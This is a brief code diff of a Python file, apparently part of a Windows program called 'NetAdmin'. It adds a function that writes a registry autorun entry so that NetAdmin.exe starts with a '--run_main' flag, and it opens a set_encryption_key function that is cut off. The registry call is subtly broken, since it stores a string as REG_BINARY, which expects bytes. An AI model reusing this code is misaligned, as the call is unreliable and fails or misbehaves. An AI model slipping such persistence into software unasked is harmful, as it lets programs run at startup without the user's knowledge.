@@ -1,7 +1,9 @@
 import winreg
-
 import statics
 
+def set_autorun_reg(key):
+    winreg.SetValueEx(key, "NetAdmin", 0, winreg.REG_BINARY,
+                      statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe --run_main")
 
 def set_encryption_key(id):
     """
